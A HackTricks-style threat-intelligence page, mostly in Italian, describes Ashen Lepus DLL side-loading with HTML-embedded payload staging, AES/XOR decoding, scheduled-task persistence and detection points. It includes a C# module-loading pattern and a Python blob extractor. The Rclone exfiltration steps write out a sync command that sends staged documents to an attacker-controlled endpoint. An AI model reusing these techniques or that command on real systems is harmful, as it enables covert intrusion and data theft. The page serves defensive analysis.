# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) ha sfruttato uno schema ripetibile che concatena DLL sideloading, staged HTML payloads e modular .NET backdoors per persistere all'interno delle reti diplomatiche del Medio Oriente. La tecnica è riutilizzabile da qualsiasi operatore perché si basa su:

- **Archive-based social engineering**: PDF benigni istruiscono i target a scaricare un archivio RAR da un sito di file-sharing. L'archivio contiene un visualizzatore di documenti EXE dall'aspetto reale, una DLL malevola nominata come una libreria di fiducia (es., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), e un decoy `Document.pdf`.
- **DLL search order abuse**: la vittima doppio-clicka l'EXE, Windows risolve l'import della DLL dalla directory corrente, e il loader malevolo (AshenLoader) viene eseguito all'interno del processo trusted mentre il PDF decoy si apre per evitare sospetti.
- **Living-off-the-land staging**: ogni stadio successivo (AshenStager → AshenOrchestrator → modules) viene mantenuto fuori dal disco fino al momento del bisogno, consegnato come blob crittografati nascosti all'interno di risposte HTML altrimenti innocue.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: l'EXE side-loads AshenLoader, che esegue host recon, lo cifra con AES-CTR e lo invia via POST all'interno di parametri rotanti come `token=`, `id=`, `q=` o `auth=` verso percorsi dall'aspetto API (es., `/api/v2/account`).
2. **HTML extraction**: il C2 rivela il passo successivo solo quando l'IP del client geolocalizza nella regione target e il `User-Agent` corrisponde all'implant, ostacolando i sandboxes. Quando i controlli passano il body HTTP contiene un blob `<headerp>...</headerp>` con il payload AshenStager crittografato Base64/AES-CTR.
3. **Second sideload**: AshenStager viene distribuito con un altro binario legittimo che importa `wtsapi32.dll`. La copia malevola iniettata nel binario recupera altro HTML, stavolta estraendo `<article>...</article>` per ricostruire AshenOrchestrator.
4. **AshenOrchestrator**: un controller .NET modulare che decodifica una config JSON Base64. I campi `tg` e `au` della config vengono concatenati/hashed nella key AES, che decripta `xrk`. i byte risultanti fungono da key XOR per ogni blob modulo scaricato successivamente.
5. **Module delivery**: ogni modulo è descritto tramite commenti HTML che reindirizzano il parser a un tag arbitrario, aggirando regole statiche che cercano solo `<headerp>` o `<article>`. I moduli includono persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) e file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Anche se i difensori bloccano o rimuovono un elemento specifico, l'operatore deve solo cambiare il tag indicato nel commento HTML per riprendere la consegna.

### Strumento rapido di estrazione (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralleli di evasione HTML Staging

Recenti ricerche su HTML smuggling (Talos) mettono in evidenza payload nascosti come stringhe Base64 all'interno di blocchi `<script>` in allegati HTML e decodificati via JavaScript a runtime. Lo stesso trucco può essere riutilizzato per risposte C2: stage encrypted blobs inside a script tag (or other DOM element) and decode them in-memory before AES/XOR, facendo apparire la pagina come HTML ordinario.

## Rafforzamento Crypto & C2

- **AES-CTR everywhere**: i loader attuali incorporano chiavi a 256-bit più nonce (es., `{9a 20 51 98 ...}`) e opzionalmente aggiungono un livello XOR usando stringhe come `msasn1.dll` prima/dopo la decifratura.
- **Infrastructure split + subdomain camouflage**: i server di staging sono separati per tool, ospitati su ASN differenti, e talvolta frontati da subdomini dall'aspetto legittimo, quindi bruciare uno stage non espone il resto.
- **Recon smuggling**: i dati enumerati ora includono elenchi di Program Files per individuare app ad alto valore e sono sempre criptati prima di lasciare l'host.
- **URI churn**: i parametri query e i percorsi REST ruotano tra le campagne (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando rilevamenti fragili.
- **Gated delivery**: i server sono geo-fenced e rispondono solo a implant reali. Client non approvati ricevono HTML non sospetto.

## Persistenza & Loop di esecuzione

AshenStager crea scheduled tasks che si spacciano per job di manutenzione di Windows ed eseguono tramite `svchost.exe`, p.es.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Questi task rilanciano la catena di sideloading all'avvio o a intervalli, permettendo ad AshenOrchestrator di richiedere moduli freschi senza toccare di nuovo il disco.

## Uso di client di sync benigni per l'exfiltrazione

Gli operatori posizionano documenti diplomatici in `C:\Users\Public` (leggibile da tutti e non sospetto) tramite un modulo dedicato, quindi scaricano il binario legittimo di [Rclone](https://rclone.org/) per sincronizzare quella directory con lo storage controllato dall'attaccante. Unit42 osserva che è la prima volta che questo attore è stato visto usare Rclone per l'exfiltrazione, in linea con la tendenza più ampia di abusare di tool legittimi di sync per confondersi nel traffico normale:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Poiché Rclone è ampiamente usato per workflow di backup legittimi, i difensori devono concentrarsi su esecuzioni anomale (nuovi binari, remoti sospetti, o sincronizzazioni improvvise di `C:\Users\Public`).

## Punti di rilevamento

- Segnalare **processi firmati** che inaspettatamente caricano DLL da percorsi scrivibili dall'utente (filtri Procmon + `Get-ProcessMitigation -Module`), specialmente quando i nomi DLL coincidono con `netutils`, `srvcli`, `dwampi`, o `wtsapi32`.
- Ispezionare risposte HTTPS sospette per **grandi blob Base64 incorporati dentro tag insoliti** o protetti da commenti `<!-- TAG: <xyz> -->`.
- Estendere la ricerca HTML a **stringhe Base64 dentro blocchi `<script>`** (staging in stile HTML smuggling) che vengono decodificate via JavaScript prima dell'elaborazione AES/XOR.
- Cercare **scheduled tasks** che eseguono `svchost.exe` con argomenti non da servizio o che puntano a directory dropper.
- Monitorare la presenza di binari **Rclone** al di fuori di posizioni gestite dall'IT, nuovi file `rclone.conf`, o job di sync che prelevano da directory di staging come `C:\Users\Public`.

## Riferimenti

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
